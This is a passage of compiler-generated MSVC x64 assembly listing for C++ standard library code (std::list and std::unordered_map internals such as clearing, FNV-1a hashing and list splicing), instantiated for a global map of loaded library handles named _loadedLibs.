	call	??$_Free_non_head@V?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@std@@@?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@SAXAEAV?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@1@PEAU01@@Z ; std::_List_node<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,void *>::_Free_non_head<std::allocator<std::_List_node<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,void *> > >

; 1493 :         _My_data._Myhead->_Next = _My_data._Myhead;

	mov	rax, QWORD PTR [rbx+8]
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash

; 1173 :         _STD fill(_Vec._Mypair._Myval2._Myfirst, _Vec._Mypair._Myval2._Mylast, _Unchecked_end());

	lea	r8, QWORD PTR $T1[rsp]
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\list

; 1493 :         _My_data._Myhead->_Next = _My_data._Myhead;

	mov	QWORD PTR [rax], rax

; 1494 :         _My_data._Myhead->_Prev = _My_data._Myhead;

	mov	rax, QWORD PTR [rbx+8]
	mov	QWORD PTR [rax+8], rax

; 1495 :         _My_data._Mysize        = 0;

	mov	QWORD PTR [rbx+16], 0

; 37   :     _List_unchecked_const_iterator(_Nodeptr _Pnode, const _Mylist* _Plist) noexcept : _Ptr(_Pnode) {

	mov	rax, QWORD PTR [rbx+8]
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash

; 1173 :         _STD fill(_Vec._Mypair._Myval2._Myfirst, _Vec._Mypair._Myval2._Mylast, _Unchecked_end());

	mov	rdx, QWORD PTR [rbx+32]
	mov	rcx, QWORD PTR [rbx+24]
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\list

; 37   :     _List_unchecked_const_iterator(_Nodeptr _Pnode, const _Mylist* _Plist) noexcept : _Ptr(_Pnode) {

	mov	QWORD PTR $T1[rsp], rax
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash

; 1173 :         _STD fill(_Vec._Mypair._Myval2._Myfirst, _Vec._Mypair._Myval2._Mylast, _Unchecked_end());

	call	??$fill@PEAV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@V12@@std@@YAXQEAV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@0@0AEBV10@@Z ; std::fill<std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > > *,std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > > >
$LN5@Clear_guar:

; 481  :                 _Target->clear();
; 482  :             }
; 483  :         }

	add	rsp, 32					; 00000020H
	pop	rbx
	ret	0
??1_Clear_guard@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@QEAA@XZ ENDP ; std::_Hash<std::_Umap_traits<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >,0> >::_Clear_guard::~_Clear_guard
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash
;	COMDAT ??0_Clear_guard@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@QEAA@QEAV12@@Z
_TEXT	SEGMENT
this$ = 8
_Target_$dead$ = 16
??0_Clear_guard@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@QEAA@QEAV12@@Z PROC ; std::_Hash<std::_Umap_traits<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >,0> >::_Clear_guard::_Clear_guard, COMDAT

; 474  :         explicit _Clear_guard(_Hash* const _Target_) : _Target(_Target_) {}

	lea	rax, OFFSET FLAT:?_loadedLibs@@3V?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@A
	mov	QWORD PTR [rcx], rax
	mov	rax, rcx
	ret	0
??0_Clear_guard@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@QEAA@QEAV12@@Z ENDP ; std::_Hash<std::_Umap_traits<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >,0> >::_Clear_guard::_Clear_guard
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\list
;	COMDAT ??F?$_List_unchecked_const_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@U_Iterator_base0@2@@std@@QEAAAEAV01@XZ
_TEXT	SEGMENT
this$ = 8
??F?$_List_unchecked_const_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@U_Iterator_base0@2@@std@@QEAAAEAV01@XZ PROC ; std::_List_unchecked_const_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > >,std::_Iterator_base0>::operator--, COMDAT

; 61   :         _Ptr = _Ptr->_Prev;

	mov	rax, QWORD PTR [rcx]
	mov	rdx, QWORD PTR [rax+8]

; 62   :         return *this;

	mov	rax, rcx
	mov	QWORD PTR [rcx], rdx

; 63   :     }

	ret	0
??F?$_List_unchecked_const_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@U_Iterator_base0@2@@std@@QEAAAEAV01@XZ ENDP ; std::_List_unchecked_const_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > >,std::_Iterator_base0>::operator--
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash
;	COMDAT ?max_size@?$_Hash_vec@V?$allocator@V?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@@std@@@std@@QEBA_KXZ
_TEXT	SEGMENT
this$dead$ = 8
?max_size@?$_Hash_vec@V?$allocator@V?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@@std@@@std@@QEBA_KXZ PROC ; std::_Hash_vec<std::allocator<std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > > > >::max_size, COMDAT

; 274  :         return (_STD min)(static_cast<size_type>((numeric_limits<difference_type>::max)()),

	mov	rax, 2305843009213693951		; 1fffffffffffffffH

; 275  :             _Aliter_traits::max_size(_Mypair._Get_first()));
; 276  :     }

	ret	0
?max_size@?$_Hash_vec@V?$allocator@V?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@@std@@@std@@QEBA_KXZ ENDP ; std::_Hash_vec<std::allocator<std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > > > >::max_size
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash
;	COMDAT ?_Max_bucket_size@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@IEBAAEBMXZ
_TEXT	SEGMENT
this$dead$ = 8
?_Max_bucket_size@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@IEBAAEBMXZ PROC ; std::_Hash<std::_Umap_traits<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >,0> >::_Max_bucket_size, COMDAT

; 1802 :         return _Traitsobj._Get_max_bucket_size();

	lea	rax, OFFSET FLAT:?_loadedLibs@@3V?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@A

; 1803 :     }

	ret	0
?_Max_bucket_size@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@IEBAAEBMXZ ENDP ; std::_Hash<std::_Umap_traits<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >,0> >::_Max_bucket_size
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash
;	COMDAT ?_Min_load_factor_buckets@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@IEBA_K_K@Z
_TEXT	SEGMENT
this$dead$ = 48
_For_size$ = 56
?_Min_load_factor_buckets@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@IEBA_K_K@Z PROC ; std::_Hash<std::_Umap_traits<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >,0> >::_Min_load_factor_buckets, COMDAT

; 1679 :     _NODISCARD size_type _Min_load_factor_buckets(const size_type _For_size) const noexcept {

$LN12:
	sub	rsp, 40					; 00000028H

; 1680 :         // returns the minimum number of buckets necessary for the elements in _List
; 1681 :         return static_cast<size_type>(_CSTD ceilf(static_cast<float>(_For_size) / max_load_factor()));

	xorps	xmm0, xmm0
	test	rdx, rdx
	js	SHORT $LN8@Min_load_f
	cvtsi2ss xmm0, rdx
	jmp	SHORT $LN9@Min_load_f
$LN8@Min_load_f:
	mov	rax, rdx
	and	edx, 1
	shr	rax, 1
	or	rax, rdx
	cvtsi2ss xmm0, rax
	addss	xmm0, xmm0
$LN9@Min_load_f:
	divss	xmm0, DWORD PTR ?_loadedLibs@@3V?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@A
	call	ceilf
	movss	xmm1, DWORD PTR __real@5f000000
	xor	ecx, ecx
	comiss	xmm0, xmm1
	jb	SHORT $LN7@Min_load_f
	subss	xmm0, xmm1
	comiss	xmm0, xmm1
	jae	SHORT $LN7@Min_load_f
	mov	rax, -9223372036854775808		; 8000000000000000H
	mov	rcx, rax
$LN7@Min_load_f:
	cvttss2si rax, xmm0
	add	rax, rcx

; 1682 :     }

	add	rsp, 40					; 00000028H
	ret	0
?_Min_load_factor_buckets@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@IEBA_K_K@Z ENDP ; std::_Hash<std::_Umap_traits<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >,0> >::_Min_load_factor_buckets
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\type_traits
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash
;	COMDAT ?bucket@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@QEBA_KAEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@@Z
_TEXT	SEGMENT
this$ = 8
_Keyval$ = 16
?bucket@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@QEBA_KAEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@@Z PROC ; std::_Hash<std::_Umap_traits<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >,0> >::bucket, COMDAT
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2244 :         return _Myres > _Small_string_capacity;

	cmp	QWORD PTR [rdx+24], 15

; 5176 :         return _Hash_array_representation(_Keyval.c_str(), _Keyval.size());

	mov	r10, QWORD PTR [rdx+16]

; 2236 :         if (_Large_mode_engaged()) {

	jbe	SHORT $LN17@bucket

; 2237 :             _Result = _Unfancy(_Bx._Ptr);

	mov	rdx, QWORD PTR [rdx]
$LN17@bucket:

; 5176 :         return _Hash_array_representation(_Keyval.c_str(), _Keyval.size());

	xor	r9d, r9d
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\type_traits

; 2333 :     return _Fnv1a_append_bytes(

	mov	r8, -3750763034362895579		; cbf29ce484222325H

; 2300 :     for (size_t _Idx = 0; _Idx < _Count; ++_Idx) {

	test	r10, r10
	je	SHORT $LN28@bucket
	mov	r11, 1099511628211			; 00000100000001b3H
	npad	6
$LL34@bucket:

; 2301 :         _Val ^= static_cast<size_t>(_First[_Idx]);

	movzx	eax, BYTE PTR [rdx+r9]
	inc	r9
	xor	r8, rax

; 2302 :         _Val *= _FNV_prime;

	imul	r8, r11
	cmp	r9, r10
	jb	SHORT $LL34@bucket
$LN28@bucket:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash

; 852  :         return _Traitsobj(_Keyval) & _Mask;

	mov	rax, QWORD PTR [rcx+48]
	and	rax, r8

; 853  :     }

	ret	0
?bucket@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@QEBA_KAEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@@Z ENDP ; std::_Hash<std::_Umap_traits<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >,0> >::bucket
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\list
;	COMDAT ?_Unchecked_splice@?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@SAPEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@2@QEAU32@00@Z
_TEXT	SEGMENT
_Before$ = 8
_First$ = 16
_Last$ = 24
?_Unchecked_splice@?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@SAPEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@2@QEAU32@00@Z PROC ; std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > >::_Unchecked_splice, COMDAT

; 469  :         // splice [_First, _Last) before _Before; returns _Last
; 470  :         _STL_INTERNAL_CHECK(_Before != _First && _Before != _Last && _First != _Last);
; 471  :         // 3 reads and 6 writes
; 472  : 
; 473  :         // fixup the _Next values
; 474  :         const auto _First_prev  = _First->_Prev;

	mov	r10, QWORD PTR [rdx+8]

; 475  :         _First_prev->_Next      = _Last;

	mov	QWORD PTR [r10], r8

; 476  :         const auto _Last_prev   = _Last->_Prev;

	mov	r9, QWORD PTR [r8+8]

; 477  :         _Last_prev->_Next       = _Before;

	mov	QWORD PTR [r9], rcx

; 478  :         const auto _Before_prev = _Before->_Prev;

	mov	rax, QWORD PTR [rcx+8]

; 479  :         _Before_prev->_Next     = _First;

	mov	QWORD PTR [rax], rdx

; 480  : 
; 481  :         // fixup the _Prev values
; 482  :         _Before->_Prev = _Last_prev;

	mov	QWORD PTR [rcx+8], r9

; 483  :         _Last->_Prev   = _First_prev;

	mov	QWORD PTR [r8+8], r10

; 484  :         _First->_Prev  = _Before_prev;

	mov	QWORD PTR [rdx+8], rax

; 485  : 
; 486  :         return _Last;

	mov	rax, r8

; 487  :     }

	ret	0
?_Unchecked_splice@?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@SAPEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@2@QEAU32@00@Z ENDP ; std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > >::_Unchecked_splice
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\list
;	COMDAT ?_Getal@?$list@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@AEBAAEBV?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@2@XZ
_TEXT	SEGMENT
this$ = 8
